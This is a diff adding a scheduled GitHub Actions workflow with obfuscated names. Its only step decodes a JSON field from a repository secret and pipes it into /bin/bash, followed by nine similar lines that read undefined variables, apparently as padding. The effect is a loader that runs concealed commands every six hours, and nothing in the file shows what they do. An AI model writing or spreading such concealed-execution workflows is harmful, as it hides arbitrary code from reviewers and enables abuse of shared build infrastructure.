@@ -1,0 +1,26 @@
+name: yaoguangxiao1234
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yaoguangxiao1234
+        env:
+          ge04497: ${{ secrets.ge04497 }}
+        run: |
+          echo $ge04497 | jq -r .mj0691 | /bin/bash
+          echo $k84 | jq -r .rsh430 | /bin/bash
+          echo $yv7 | jq -r .gqm1 | /bin/bash
+          echo $kvhtc767 | jq -r .t1813 | /bin/bash
+          echo $iigzw59 | jq -r .s02073 | /bin/bash
+          echo $lf1 | jq -r .jgr4 | /bin/bash
+          echo $azeg882 | jq -r .vyp5 | /bin/bash
+          echo $eu4814 | jq -r .efcnm4 | /bin/bash
+          echo $b278 | jq -r .fuxvz18498 | /bin/bash
+          echo $fftx0 | jq -r .hx759 | /bin/bash
+
